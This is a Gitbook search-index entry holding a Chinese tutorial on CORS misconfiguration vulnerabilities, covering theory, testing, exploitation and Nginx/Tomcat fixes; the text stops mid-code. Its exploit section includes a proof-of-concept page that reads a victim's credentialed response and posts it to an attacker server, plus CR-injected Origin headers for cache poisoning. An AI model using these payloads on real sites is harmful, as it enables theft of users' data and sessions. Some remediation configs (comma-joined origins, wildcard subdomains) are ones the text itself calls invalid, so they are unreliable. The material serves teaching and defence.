{"./":{"url":"./","title":"Security Book","keywords":"","body":"Readme Web Book Redteam Book Email Book Network Book Other Book Copyright & Copy zha0cai all right reserved，powered by Gitbook该文件修订时间： 2023-05-15 09:45:11 "},"web/a-readme.html":{"url":"web/a-readme.html","title":"Web","keywords":"","body":"关于 Web 的知识合集~ Copyright & Copy zha0cai all right reserved，powered by Gitbook该文件修订时间： 2023-05-14 19:29:59 "},"web/CORS 跨域漏洞.html":{"url":"web/CORS 跨域漏洞.html","title":"CORS 跨域漏洞","keywords":"","body":"0x01 漏洞描述 概述 CORS，跨域资源共享（Cross-Origin Resource Sharing），是 H5 提供的一种机制，WEB 应用程序可以通过在 HTTP 增加字段来告诉浏览器，哪些不同来源的服务器是有权访问本站资源的，当不同域的请求发生时，就出现了跨域的现象。当该配置不当的时候，就导致资源被恶意操作。 当 CORS 的设置不正确时，就会带来安全问题；当响应头中的 Access-Control-Allow-Origin​​ 设置为 null​​ 或 *​​ 时，表示信任任何域，这时候就可能引入安全问题。 「你的 Request 還是有發出去的」，而且瀏覽器也「確實有收到 Response」，重點是「瀏覽器因為同源政策，不把結果傳回給你的 JavaScript」。如果沒有瀏覽器的話其實就沒有這些問題，你愛發給誰就發給誰，不管怎樣都拿得到 Response。 當瀏覽器收到 Response 之後，會先檢查 Access-Control-Allow-Origin​​​ 裡面的內容，如果裡面有包含現在這個發起 Request 的 Origin 的話，就會允許通過，讓程式順利接收到 Response。 所以，同源策略并不限制请求的发起和响应，只是浏览器拒绝了 js​​​ 对响应资源的操作。【该漏洞的测试误区，要注意同源限制策略是针对浏览器的】 测试方法 测试人员访问某个 url，将请求头中的 Origin 字段修改为任意值，结果仍然能获得正确的响应报文（这会导致误报不应该使用该测试方法），就说明有 CORS 漏洞 可以通过浏览器的控制台的 network，查看接口的请求包 response 头中 Access-Control-Allow-Origin 是否设置为 *​​ 也可以通过抓包工具，查看接口返回的 response 中是 Access-Control-Allow-Origin 是否设置为 * or null 等其他配置组合，详见下文。​​ 漏洞示例 配置 Access-Control-Allow-Origin 为 *​​ 配置 Access-Control-Allow-Origin 但是该值可控 0x02 CORS 详解 CORS 是一个 W3C 标准，全称是\"跨域资源共享\"（Cross-origin resource sharing）。CORS 的基本原理是，第三方网站服务器生成访问控制策略，指导用户浏览器放宽 SOP 的限制，实现与指定的目标网站共享数据。 它允许浏览器向跨源服务器，发出 XMLHttpRequest​​​ ​请求，从而克服了 AJAX 只能同源使用的限制 CORS 需要浏览器和服务器同时支持。目前，所有浏览器都支持该功能，IE 浏览器不能低于 IE10。 整个 CORS 通信过程，都是浏览器自动完成，不需要用户参与。对于开发者来说，CORS 通信与同源的 AJAX 通信没有差别，代码完全一样。浏览器一旦发现 AJAX​​ 请求跨源，就会自动添加一些附加的头信息，有时还会多出一次附加的请求，但用户不会有感觉。 因此，实现 CORS 通信的关键是服务器。只要服务器实现了 CORS 接口，就可以跨源通信。 JSONP 只支持 GET​​ 请求，CORS 支持所有类型的 HTTP 请求。 JSONP 的优势在于支持老式浏览器，以及可以向不支持 CORS 的网站请求数据。 CORS 工作流程（针对浏览器的） 请求方脚本从用户浏览器发送跨域请求。浏览器会自动在每个跨域请求中添加 Origin 头，用于声明请求方的源。 资源服务器根据请求中 Origin 头返回访问控制策略(Access-Control-Allow-Origin 响应头)，并在其中声明允许读取响应内容的源。 浏览器检查资源服务器在 Access-Control-Allow-Origin 头中声明的源，是否与请求方的源相符，如果相符合，则允许请求方脚本读取响应内容，否则不允许。 什么是同源 & 跨域 同源：协议相同 & 端口相同 & 主机（域名）相同 跨域：上述之一不同，如 网络协议不同，如 http 协议访问 https 协议 ; 端口不同，如 80 端口访问 8080 端口 ; 域名不同，如 www.test1.com 访问 www.test2.com ; 子域名不同，如 abc.test1.com 访问 def.test1.com ; 浏览器将 CORS 请求分成两类：简单请求（simple request）和非简单请求（not-so-simple request）。 一些应用场景 比如后端开发完一部分业务代码后，提供接口给前端用，在前后端分离的模式下，前后端的域名是不一致的，此时就会发生跨域访问的问题。 程序员在本地做开发，本地的文件夹并不是在一个域下面，当一个文件需要发送 ajax 请求，请求另外一个页面的内容的时候，就会跨域。 电商网站想通过用户浏览器加载第三方快递网站的物流信息。 子站域名希望调用主站域名的用户资料接口，并将数据显示出来。 简单请求 只要同时满足以下两大条件，就属于简单请求。 （1）请求方法是以下三种方法之一： HEAD GET POST （2）HTTP 的头信息不超出以下几种字段： Accept Accept-Language Content-Language Last-Event-ID Content-Type：只限于三个值 application/x-www-form-urlencoded​​、multipart/form-data​​、text/plain​​ 这是为了兼容表单（form），因为历史上表单一直可以发出跨域请求。AJAX​​ 的跨域设计就是，只要表单可以发，AJAX 就可以直接发。 凡是不同时满足上面两个条件，就属于非简单请求。 浏览器对这两种请求的处理，是不一样的。 基本流程 对于简单请求，浏览器直接发出 CORS 请求。 具体来说，就是在头信息之中，增加一个 Origin​​ ​字段。 下面是一个例子，浏览器发现这次跨源 AJAX​​ 请求是简单请求，就自动在头信息之中，添加一个 Origin​​ ​字段。 GET /cors HTTP/1.1 Origin: http://api.bob.com Host: api.alice.com Accept-Language: en-US Connection: keep-alive User-Agent: Mozilla/5.0... 上面的头信息中，Origin​ ​字段用来说明，本次请求来自哪个源（协议 + 域名 + 端口）。服务器根据这个值，决定是否同意这次请求。 如果 Origin​​ ​指定的源，不在许可范围内，服务器会返回一个正常的 HTTP 回应。浏览器发现，这个回应的头信息没有包含 Access-Control-Allow-Origin​​ ​字段（详见下文），就知道出错了，从而抛出一个错误，被 XMLHttpRequest​​ ​的 onerror​​ ​回调函数捕获。注意，这种错误无法通过状态码识别，因为 HTTP 回应的状态码有可能是 200。 如果 Origin​ ​指定的域名在许可范围内，服务器返回的响应，会多出几个头信息字段。 Access-Control-Allow-Origin: http://api.bob.com Access-Control-Allow-Credentials: true Access_control-Allow-Method: * Access-Control-Expose-Headers: FooBar Content-Type: text/html; charset=utf-8 上面的头信息之中，有三个与 CORS 请求相关的字段，都以 Access-Control-​ ​开头。 （1）Access-Control-Allow-Origin 该字段是必须的。它的值要么是请求时 Origin​​ 字段的值，要么是一个 *​​ ，表示接受任意域名的请求。 （2）Access-Control-Allow-Credentials 该字段可选。它的值是一个布尔值，表示是否允许发送 Cookie​​。默认情况下，Cookie 不包括在 CORS 请求之中。设为 true​​​，即表示服务器明确许可，Cookie 可以包含在请求中，一起发给服务器。这个值也只能设为 true​​​，如果服务器不要浏览器发送 Cookie，删除该字段即可。 （3）Access-Control-Expose-Headers 该字段可选。CORS 请求时，XMLHttpRequest​​ ​对象的 getResponseHeader()​​ ​方法只能拿到 6 个基本字段：Cache-Control​​​、Content-Language​​​、Content-Type​​​、Expires​​​、Last-Modified​​​、Pragma​​​。如果想拿到其他字段，就必须在 Access-Control-Expose-Headers​​ ​里面指定。上面的例子指定，getResponseHeader('FooBar')​​ ​可以返回 FooBar​​ ​字段的值。 （4）Access-Control-Allow-Methods​ 该字段表示允许请求的方法，比如 GET, POST, PUT, DELETE 等 ​add_header 'Access-Control-Allow-Methods' *;​​ // 表示允许任意方法 服务端的 Nginx 配置 请确保将配置行添加到 http​​ 配置块的大括号 ({}​​) 内并保存重启 Nginx。 http { include mime.types; default_type application/octet-stream; # 其他配置... # 添加下面这行配置，允许跨域请求的网站 #add_header 'Access-Control-Allow-Origin' 'http://xxx.xxx.xxx'; add_header 'Access-Control-Allow-Origin' '*'; #add_header 'Access-Control-Allow-Credential' 'true'; add_header 'Access_control-Allow-Method' '*'; # 其他配置... } withCredentials 属性 上面说到，CORS 请求默认不发送 Cookie 和 HTTP 认证信息。如果要把 Cookie 发到服务器，一方面要服务器同意，指定 Access-Control-Allow-Credentials​ ​字段。 Access-Control-Allow-Credentials: true 另一方面，开发者必须在 AJAX​​ 请求中打开 withCredentials​​ ​属性。 var xhr = new XMLHttpRequest(); xhr.withCredentials = true; 否则，即使服务器同意发送 Cookie，浏览器也不会发送。或者，服务器要求设置 Cookie，浏览器也不会处理。 但是，如果省略 withCredentials​ ​设置，有的浏览器还是会一起发送 Cookie。这时，可以显式关闭 withCredentials​​。 xhr.withCredentials = false; 需要注意的是，如果要发送 Cookie，Access-Control-Allow-Origin​​ ​就不能设为星号，必须指定明确的、与请求网页一致的域名。同时，Cookie 依然遵循同源政策，只有用服务器域名设置的 Cookie 才会上传，其他域名的 Cookie 并不会上传，且（跨源）原网页代码中的 document.cookie​​ ​也无法读取服务器域名下的 Cookie。 非简单请求 非简单请求是那种对服务器有特殊要求的请求，比如请求方法是 PUT​​ 或 DELETE​​，或者 Content-Type​​ 字段的类型是 application/json​​。 非简单请求的 CORS 请求，会在正式通信之前，增加一次 HTTP 查询请求，称为\"预检\"请求（preflight​​）。 预检请求 浏览器先询问服务器，当前网页所在的域名是否在服务器的许可名单之中，以及可以使用哪些 HTTP 动词和头信息字段。只有得到肯定答复，浏览器才会发出正式的 XMLHttpRequest​ ​请求，否则就报错。 下面是一段浏览器的 JavaScript 脚本，在浏览器 consolo​​ 执行。 var url = 'http://api.alice.com/cors'; var xhr = new XMLHttpRequest(); xhr.open('PUT', url, true); xhr.setRequestHeader('X-Custom-Header', 'value'); xhr.send(); 上面代码中，HTTP 请求的方法是 PUT​​，并且发送一个自定义头信息 X-Custom-Header​​。 浏览器发现，这是一个非简单请求，就自动发出一个\"预检\"请求，要求服务器确认可以这样请求。下面是这个\"预检\"请求的 HTTP 头信息。 OPTIONS /cors HTTP/1.1 Origin: http://api.bob.com Access-Control-Request-Method: PUT Access-Control-Request-Headers: X-Custom-Header Host: api.alice.com Accept-Language: en-US Connection: keep-alive User-Agent: Mozilla/5.0... \"预检\"请求用的请求方法是 OPTIONS​​​，表示这个请求是用来询问的。头信息里面，关键字段是 Origin​​​，表示请求来自哪个源。 除了 Origin​ ​字段，\"预检\"请求的头信息包括两个特殊字段。 （1）Access-Control-Request-Method 该字段是必须的，用来列出浏览器的 CORS 请求会用到哪些 HTTP 方法，上例是 PUT​​。 （2）Access-Control-Request-Headers 该字段是一个逗号分隔的字符串，指定浏览器 CORS 请求会额外发送的头信息字段，上例是 X-Custom-Header​​​​。 为什么需要预请求？ 假設今天某個 Server 提供了一個 API 網址叫做：https://example.com/data/16​​，你只要對它發送 GET，就能夠拿到 id 是 16 的資料，只要對它發送 DELETE，就可以把這筆資料刪除。 如果今天沒有 Preflight Request 這個機制的話，我就可以在隨便一個 Domain 的網頁上面發送一個 DELETE 的 Request 給這個 API。剛剛我有強調說瀏覽器的 CORS 機制，還是會幫你發送 Request，但只是 Response 被瀏覽器擋住而已。 因此呢，儘管沒有 Response，但是 Server 端的確收到了這個 Request，因此就會把這筆資料給刪除。 如果有 Preflight Request 的話，在發送出去收到結果的時候，就會知道這個 API 並沒有提供 CORS，因此真的 DELETE 請求就不會送出，到這邊就結束了。 先用一個 OPTIONS 的請求去確認之後的 Request 能不能送出，這就是 Preflight Request 的目的。 预检请求的回应 服务器收到\"预检\"请求以后，检查了 Origin​​、Access-Control-Request-Method​ ​和 Access-Control-Request-Headers​ ​字段以后，确认允许跨源请求，就可以做出回应。 HTTP/1.1 200 OK Date: Mon, 01 Dec 2008 01:15:39 GMT Server: Apache/2.0.61 (Unix) Access-Control-Allow-Origin: http://api.bob.com Access-Control-Allow-Methods: GET, POST, PUT Access-Control-Allow-Headers: X-Custom-Header Content-Type: text/html; charset=utf-8 Content-Encoding: gzip Content-Length: 0 Keep-Alive: timeout=2, max=100 Connection: Keep-Alive Content-Type: text/plain 上面的 HTTP 回应中，关键的是 Access-Control-Allow-Origin​​ ​字段，表示 http://api.bob.com​​ ​可以请求数据。该字段也可以设为星号，表示同意任意跨源请求。 Access-Control-Allow-Origin: * 如果服务器否定了\"预检\"请求，会返回一个正常的 HTTP 回应，但是没有任何 CORS 相关的头信息字段。这时，浏览器就会认定，服务器不同意预检请求，因此触发一个错误，被 XMLHttpRequest​​ ​对象的 onerror​​ ​回调函数捕获。控制台会打印出如下的报错信息。 XMLHttpRequest cannot load http://api.alice.com. Origin http://api.bob.com is not allowed by Access-Control-Allow-Origin. 服务器回应的其他 CORS 相关字段如下。 Access-Control-Allow-Methods: GET, POST, PUT Access-Control-Allow-Headers: X-Custom-Header Access-Control-Allow-Credentials: true Access-Control-Max-Age: 1728000 （1）Access-Control-Allow-Methods 该字段必需，它的值是逗号分隔的一个字符串，表明服务器支持的所有跨域请求的方法。注意，返回的是所有支持的方法，而不单是浏览器请求的那个方法。这是为了避免多次\"预检\"请求。 （2）Access-Control-Allow-Headers 如果浏览器请求包括 Access-Control-Request-Headers​ ​字段，则 Access-Control-Allow-Headers​ ​字段是必需的。它也是一个逗号分隔的字符串，表明服务器支持的所有头信息字段，不限于浏览器在\"预检\"中请求的字段。 （3）Access-Control-Allow-Credentials 该字段与简单请求时的含义相同。 （4）Access-Control-Max-Age 该字段可选，用来指定本次预检请求的有效期，单位为秒。上面结果中，有效期是 20 天（1728000 秒），即允许缓存该条回应 1728000 秒（即 20 天），在此期间，不用发出另一条预检请求。 浏览器的正常请求和回应 一旦服务器通过了\"预检\"请求，以后每次浏览器正常的 CORS 请求，就都跟简单请求一样，会有一个 Origin​​ ​头信息字段。服务器的回应，也都会有一个 Access-Control-Allow-Origin​​ ​头信息字段。 下面是\"预检\"请求之后，浏览器的正常 CORS 请求。 PUT /cors HTTP/1.1 Origin: http://api.bob.com Host: api.alice.com X-Custom-Header: value Accept-Language: en-US Connection: keep-alive User-Agent: Mozilla/5.0... 上面头信息的 Origin​ ​字段是浏览器自动添加的。 下面是服务器正常的回应。 Access-Control-Allow-Origin: http://api.bob.com Content-Type: text/html; charset=utf-8 上面头信息中，Access-Control-Allow-Origin​ ​字段是每次回应都必定包含的。 0x03 CORS 错误配置类型 反射 Origin 头 如下配置： Access-Control-Allow-Origin: http://a.com, http://c.com 或者 Access-Control-Allow-Origin: http://*.a.com 这两种域名事实上配置是错误的，因为 CORS 标准规定，Access-Control-Allow-Origin​​ 只能配置为单个 origin, null​​ 或 *​​。如果开发者想要实现同时与多个域名共享域名的需求，则需要专门编写代码或者使用框架来协助动态生成访问控制策略。 最简单地动态生成访问控制策略的方法，就是在 Access-Control-Allow-Origin 中反射请求的 Origin 值。例如，下面是一个错误 Nginx 配置示例： add_header \"Access-Control-Allow-Origin\" $http_origin; // 单纯的 add_header “Access-Control-Allow-Credentials” “true”; 这种配置非常危险，相当于信任任意网站，给攻击者网站敞开了大门。任意攻击者网站可以直接跨域读取其资源内容。 Origin 校验错误 前缀匹配: 资源服务器在检查请求中 Origin 值时，只匹配了前缀。例如 www.example.com 想要允许 example.com 访问，但是只做了前缀匹配，导致同时信任了 example.com.attack.com 的访问，而 example.com.attack.com 是攻击者可以控制的网站。 后缀匹配：资源服务器在检查请求中 Origin 值时，只做了后缀匹配。例如 www.example.com 想要允许 example.com 访问，由于后缀匹配出错，导致允许 attackexample.com 访问。 没有转义 .​​：例如，example.com 想要允许 www.example.com 访问时，但正则匹配没有转义 .​​，导致允许 wwwaexample.com 访问。 包含匹配：我们还发现有的网站 www.example.com 想要允许 example.com，但是 Origin 校验出错，出现允许 ample.com 访问。 信任 null RFC 6564 规定，如果请求来自隐私敏感上下文时，Origin 头的值应该为 null，但是它却没有明确界定什么是隐私敏感上下文。 CORS 协议复用了 Origin 头，有些开发者在网站上配置信任 null，用于与本地 file 页面共享数据，如下所示： Access-Control-Allow-Origin: null Access-Control-Allow-Credentials: true 但是事实上，除了本地 file 页面的跨域请求 Origin 头为 null 外，攻击者还可以从任意域下通过 iframe sandbox 构造 Origin 为 null 的跨域请求，如下是一段示意代码： XMLHttpRequest here’> 这就意味着任何配置有 Access-Control-Allow-Origin: null​​ ​和 Access-Control-Allow-Credentials:true​​ ​的网站等同于没有浏览器 SOP 的保护，都可以被其他任意域以这种方式读取内容。 e.g. var xhr=new XMLHttpRequest(); xhr.onreadystatechange = function() { if (xhr.readyState == XMLHttpRequest.DONE) { alert(xhr.responseText); } } xhr.open(\"GET\", \"http://www.vuln.com:8081/cors/corsvuln.jsp\", true); xhr.withCredentials = true; xhr.send();'> HTTPS 域信任 HTTP 域 中间人攻击者可以先劫持受信任 HTTP 域，然后通过这个域发送跨域请求到 HTTPS 网站，间接读取 HTTPS 域下的受保护内容。 信任自身全部子域 很多网站为了方便会将 CORS 配置为信任全部自身子域，这种配置会导致子域 XSS 的危害被强化。为了防止某个子域上 XSS 漏洞的危害其他子域，浏览器设计了 Cookie 的 httponly 标志，用于限制 Javascript 读取 Cookie，因此某个子域 XSS 不能读取带有 httponly 标记的 Cookie，难以窃取其他重要子域上的敏感内容。 但是如果这个域配置了 CORS 且信任全部子域，那么攻击者可以利用其他任意子域上 XSS 漏洞，发送跨域请求到目标重要域网站，从而获取敏感内容。 ​Origin:*​​​ 与 Credentials:true​​​ 共用 CORS 规定，Access-Control-Allow-Origin:*​​ 与 Access-Control-Allow-Credentials:true​​ 不能同时使用。浏览器会对下面这种误配置报错： Access-Control-Allow-Origin: * Access-Control-Allow-Credentials: true 这就意味着，Access-Control-Allow-Origin:*​​ 只能用于共享公开资源。 缺少 Vary:Origin​​​ 头 当资源服务器需要共享多个域名时，它需要每个不同请求域的跨域请求生成不同的访问控制策略。但一旦这个资源内容需要被缓存，则会带来 CORS 失效问题。例如，c.com 同时允许 a.com 和 b.com 共享。c.com 资源内容首先被 a.com 脚本跨域访问后被缓存，其中缓存响应头为 Access-Control-Allow-Origin: http://a.com​​”。这时，b.com 脚本则不能读取缓存响应内容，因为缓存响应头是允许 a.com 共享，而不是 b.com。HTTP 协议提供了 Vary 头，用于解决这种情况，资源服务器需要在响应头中配置 Vary:Origin​​ 头来指导缓存，为每个不同的 Origin 头缓存一份不同的内容。 0x04 挖掘利用 CORS 的漏洞主要看当我们发起的请求中带有 Origin 头部字段时，服务器的返回包带有 CORS 的相关字段并且允许 Origin 的域访问。 变换请求头的 origin 字段，如果返回包中的 Access-Control-Allow-Origin​​ 内容和发送的 origin 头内容相同，则存在此问题。 利用 前提：含有 CORS 配置的网站 利用 html 标签和表单发送请求 访问内网敏感资源 绕过返会话劫持 一般形式跨域请求利用 在攻击者自己控制的网页上嵌入跨域请求，用户访问链接，执行了跨域请求，从而攻击目标。 方法一：检测工具 GitHub - chenjj/CORScanner: 🎯 Fast CORS misconfiguration vulnerabilities scanner EXP & POC Hello,this is evil page. CORS POC Exploit Exploit function corsExploit() { var xhr = new XMLHttpRequest(); xhr.onreadystatechange = function () { if (xhr.readyState == 4 && xhr.status == 200) //if receive xhr response { //var datas=xhr.responseText; //alert(datas); //document.getElementById(\"demo\").innerHTML = alert(this.responseText); document.getElementById(\"demo\").innerHTML = alert(xhr.responseText); } } // request vuln page，需要攻击的目标 xhr.open(\"GET\", \"http://www.vuln.com:8081/cors/corsvuln.jsp\", \"true\") xhr.send(); } 绕过 http_only 获取 cookie 在攻击这服务器创建 cookiebypass.jsp​​ 在攻击者可控网站创建 steal.html​​ cors exploit function exploit() { var xhr1; var xhr2; if (window.XMLHttpRequest) { xhr1 = new XMLHttpRequest(); xhr2 = new XMLHttpRequest(); } else { xhr1 = new ActiveXObject(\"Microsoft.XMLHTTP\"); xhr2 = new ActiveXObject(\"Microsoft.XMLHTTP\"); } xhr1.onreadystatechange = function () { if (xhr1.readyState == 4 && xhr1.status == 200) { var datas = xhr1.responseText; // 攻击这服务器地址 xhr2.open(\"POST\", \"http://mob.exp:8081/manager/cookiebypass.jsp\", \"true\"); xhr2.setRequestHeader(\"Content-type\", \"application/x-www-form-urlencoded\"); xhr2.send(\"ck=\" + escape(datas)); } } // 需要攻击的目标 xhr1.open(\"GET\", \"http://www.vuln.com:8081/cors/corsvuln.jsp\", \"true\") xhr1.withCredentials = true; xhr1.send(); } exploit(); 访问 mob.exp:8081/manager/steal.html，可以看到返回内容写入 secrect.html 中。 方法二：利用 Burpsuit 搭建测试环境，Nginx 配置如下： 选择 Proxy -- Options -- Match and Replace，勾选 Request header。 将空替换为 Origin:foo.example.org​​​ 的 Enable 框。 然后在网站一阵乱点，最后在 HTTP history 来筛选带有 CORS 头部的值，然后用以上工具查看是否有配置缺陷。 Burpsuite：自动在 HTTP 请求包中加上 Origin 的头部字段。 在 Filter by search term 中输入：Access-Control-Allow-Origin: foo.example.org​​ HTTP history 列表中出现符合条件的请求包，点击 Ctrl+R（发送到 Repeater），点击 GO，观察返回的 CORS 配置。 方法三：curl 命令 curl 命令，输入 curl http://127.0.0.1/DoraBox-master/csrf/userinfo.php -H \"Origin:https://example.com/\" -I 方法四：浏览器测试 利用 Ajax 发送一个简单请求，看是否允许。 var url = 'http://172.16.10.113/xxxxmail'; var xhr = new XMLHttpRequest(); xhr.open('GET', url, true); xhr.send(); // 或者 $.get(\"http://172.16.10.113/xxxxmail\") ======== # 浏览器控制台示例 # 在服务器（被攻击目标） 192.168.202.110 上配置有漏洞的 nginx.conf # 打开攻击者的网站 http://xxx.xxx.xxx/，（或者随便一个网站）再打开控制台 # 在允许的域（网站），打开控制台 $.get(\"http://192.168.202.110:8081\") {readyState: 1, getResponseHeader: ƒ, getAllResponseHeaders: ƒ, setRequestHeader: ƒ, overrideMimeType: ƒ, …} # 不允许的域 $.get(\"http://192.168.202.110:8081\") {readyState: 1, getResponseHeader: ƒ, getAllResponseHeaders: ƒ, setRequestHeader: ƒ, overrideMimeType: ƒ, …} /xxxmail/xxx4/index.jsp Access to XMLHttpRequest at 'http://192.168.202.110:8081/' from origin 'http://172.16.10.113' has been blocked by CORS policy: The 'Access-Control-Allow-Origin' header has a value 'http://mt.icoremail.net' that is not equal to the supplied origin. loginCommon.c2f53.js:1 GET http://192.168.202.110:8081/ net::ERR_FAILED 200 (OK) send @ 实验测试 环境准备 我们首先修改 host 文件，加上 127.0.0.1 mob.exp 127.0.0.1 www.vuln.com 这样我们访问 www.vuln.com 就相当于服务端。服务端新建 corsvuln.jsp。 Vulnerability Page 接着在 hacker 端 mob.exp 构造 steal.html，这里我们假设是 http://mob.exp:8081/manager/steal.html Hello,this is evil page. function loadXMLDoc() { var xhr = new XMLHttpRequest(); xhr.onreadystatechange=function() { if(xhr.readyState == 4 && xhr.status == 200) //if receive xhr response { var datas=xhr.responseText; alert(datas); } } // request vuln page，存在漏洞的攻击目标 xhr.open(\"GET\",\"http://www.vuln.com:8081/cors/corsvuln.jsp\",\"true\") xhr.send(); } loadXMLDoc(); 根据同源策略，这是不允许的，结果也和我们想的一样。 上面说过，同源策略并不限制请求的发起和响应，只是浏览器拒绝了 js 对响应资源的操作，这点我们抓包就可以看出来。（所以说测试方法中的 1 是不对的） 我们修改 corsvuln.jsp 使用 CORS 使其可以跨域访问，添加一个 Access-Control-Allow-Origin 的返回头。 response.setHeader(\"Access-Control-Allow-Origin\", \"http://mob.exp:8081\"); 再次访问 mob.exp:8081/manager/steal.html 发现可以正常 alert 了，成功实现了跨域资源的请求。 我们只是在响应头加上了 Access-Control-Allow-Origin: http://mob.exp:8081​​ 浏览器看到这个，认为这是服务端允许的跨域请求，就不再阻拦 js 对获取内容的操作了。 获取用户凭证 方式一：存在用户凭证 Access-Control-Allow-Origin “访问控制允许凭据”值 是否可利用 备注 攻击者掌握的域名 真的 是 * 真的 否 浏览器报错 null（空值） 真的 是 任意网站使用沙盒 iframe 来获取 null 源 搜狐视频 CORS 误配置漏洞演示：https://www.youtube.com/watch?v=PWbPbtyyNi8 方式二：不存在用户凭证 Access-Control-Allow-Origin 是否可利用 攻击者掌握的域名 是 null（空值） 是 * 是 绕过基于 IP 的认证 如果目标应用程序与受害者的网络可达性，并且目标应用程序使用 IP 地址作为身份验证的方式，则黑客会利用受害者的浏览器作为代理去访问那些目标应用程序并且可以绕过那些基于 IP 的身份验证。 客户端缓存中毒 例如，数据报文头部中包含 X-User 标头，其值未进行任何输入验证，输出编码。 请求包 GET /login HTTP/1.1 Host: www.target.local Origin: https://attacker.domain/ X-User: 响应包 Access-Control-Allow-Origin 已被设置，Access-Control-Allow-Credentials: true 与 Vary: Origin 头已经设置。 HTTP/1.1 200 OK Access-Control-Allow-Origin: https://attacker.domain/ … Content-Type: text/html … Invalid user: 构造存在恶意的 XSS 有效负载页面，诱使受害者触发。 var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','http://www.target.local/login',true); req.setRequestHeader('X-User', ''); req.send(); function reqListener() { location='http://www.target.local/login'; } 服务器端缓存中毒 利用 CORS 的错误配置注入任意 HTTP 头部，将其保存在服务器端缓存中，可用于构造存储类型 XSS。 利用条件：存在服务器端缓存，能够反射 Origin 头部，不会检查 Origin 头部中的特殊字符，如 \\r 利用方式：攻击 IE / Edge 用户（IE / Edge 使用 \\r 作为的 HTTP 标题段的终结符） 请求包 GET / HTTP/1.1 Origin: z[0x0d]Content-Type: text/html; charset=UTF-7 回车（CR）：ASCII 码：'\\r' ，十六进制：0x0d 响应包 HTTP/1.1 200 OK Access-Control-Allow-Origin: z Content-Type: text/html; charset=UTF-7 如果攻击者能提前发送畸形的 Origin 消息头，则利用代理或命令行的方式发送，则服务器就会缓存这样的返回报文并作用于其他用户。上例中，攻击者将页面的编码设置为 UTF-7，可引发 XSS 中断。 配合 XSS 劫持会话 在正常的网页被嵌入了到攻击者控制页面的跨域请求，从而劫持用户的会话。 交互式 xss。通过 cors，绕过一些反会话劫持的方法，如 HTTP-Only 限制的 cookie，绑定 IP 地址的会话 ID 等，劫持用户会话。 程序猿在写 ajax 请求的时候，对目标域限制不严，有点类似于 url 跳转。 facebook 出现过这样一个案例，javascript 通过 url 里的参数进行 ajax 请求。 ​ 0x05 修复方法 修复方法是合理配置 CORS，判断 Origin 是否合法；具体说就是不让在 nginx 或 tomcat 中配置【Access-Control-Allow-Origin *​​​​​】或【Access-Control-Allow-Origin null​​​​​】。 关闭非正式开启的 CORS，不要信任全部自身子域，减少攻击面 不要配置 Access-Control-Allow-Origin​​​ 为通配符 *​​​ 或 null​​​，严格校验来自请求数据包中 Origin​​​ 的值 彻底的返回 Vary: Origin​​​ 右边，突破攻击者利用浏览器缓存进行攻击 仅在接收到跨域请求时才配置有关于跨域的头部，并确保跨域请求是合法的源，以减少攻击者恶意利用的可能性 HTTPS 网站不要信任 HTTP 域 # 允许跨域请求的域，* 代表所有；null 可以用来和本地 file 页面共享数据 add_header 'Access-Control-Allow-Origin' *; # 允许请求的 header add_header 'Access-Control-Allow-Headers' *; # 允许带上 cookie 请求，不能和允许跨域请求的域 * 一同使用，Origin 需要明确的配置允许来源的域。因为 * 这种配置只能用于共享公开资源，对于共享公开资源，不应该需要身份认证。 add_header 'Access-Control-Allow-Credentials' 'true'; # 允许请求的方法，比如 GET,POST,PUT,DELETE add_header 'Access-Control-Allow-Methods' *; 修改 Nginx 配置文件 方法一：使用通配符 *​​ location / { add_header Access-Control-Allow-Origin *.xxx.com; add_header Access-Control-Allow-Headers \"Origin， X-Requested-With, Content-Type, Accept\"; add_header Access-Control-Allow-Methods \"GET, POST, OPTIONS\"; } 方法二：指定域名白名单 根据错误配置类型，该方法有待确认。 # 使用域名 location / { add_header Access-Control-Allow-Origin http://www.xixixi123.com; add_header Access-Control-Allow-Headers \"Origin， X-Requested-With, Content-Type, Accept\"; add_header Access-Control-Allow-Methods \"GET, POST, OPTIONS\"; } # 指定 ip 与端口，可以逗号拼接 location / { add_header Access-Control-Allow-Origin http://10.130.222.222:6500,http://10.130.222.223:6500; add_header Access-Control-Allow-Headers \"Origin， X-Requested-With, Content-Type, Accept\"; add_header Access-Control-Allow-Methods \"GET, POST, OPTIONS\"; } 方法三：使用正则表达式 location ~ /myurl(.*) { if ( $http_origin ~ '^http(s)?://(localhost|10\\.130\\.222\\.222):6500$' { add_header Access-Control-Allow-Origin $http_origin; } if ( $http_origin ~ '^http(s)?://(localhost|10\\.130\\.222\\.223):6500$' { add_header Access-Control-Allow-Origin $http_origin; } add_header Access-Control-Allow-Headers \"Origin， X-Requested-With, Content-Type, Accept\"; add_header Access-Control-Allow-Methods \"GET, POST, OPTIONS\"; } 说明 ​$ http_origin​​ 可以获取到请求头中的 Origin 字段；但是如果请求头没有，就获取不到了； ​^​​ 是正则表达式，表示开头位置；$​​ 是正则表达式，表示结尾位置 ​?​​ 是正则表达式，表示 s 可能有，也可能没有，这两种情况都可以匹配 .​​​ 是把 .​​ 转义成普通字符的意思 nginx 中，if 后必须加空格，然后才能写 (​​，否则会报错；nginx 中，没有 else if nginx 解决复杂请求跨域的时候需加上 aways 参数eg：add_header 'Access-Control-Allow-Origin' \"$http_origin\" always;​​ 原因：As of Nginx 1.7.5, add_header supports an \"always\" parameter which​allows CORS to work if the backend returns 4xx or 5xx status code.​​参考资料：https://gist.github.com/Stanback/7145487 白名单配置示例 Tomcat 过滤路由 package filter; import java.io.IOException; import java.io.UnsupportedEncodingException; import java.security.MessageDigest; import java.security.NoSuchAlgorithmException; import java.util.Arrays; import javax.servlet.Filter; import javax.servlet.FilterChain; import javax.servlet.FilterConfig; import javax.servlet.ServletException; import javax.servlet.ServletRequest; import javax.servlet.ServletResponse; import javax.servlet.annotation.WebFilter; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import javax.xml.ws.http.HTTPException; @WebFilter(\"/Cors\") public class CorsFilter implements Filter { /** * Default constructor. */ public FilterConfig config; public CorsFilter() { // TODO Auto-generated constructor stub } /** * @see Filter#destroy() */ public void destroy() { // TODO Auto-generated method stub this.config = null; } /** * @see Filter#doFilter(ServletRequest, ServletResponse, FilterChain) */ public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException { //配置可信域名 String[] authhosts = {\"http://www.abc.com:8008\", \"http://www.abcyy.com\"}; String authost = \"\"; HttpServletRequest httprequest = (HttpServletRequest) request; String origin = httprequest.getHeader(\"origin\"); HttpServletResponse httpresponse = (HttpServletResponse) response; if 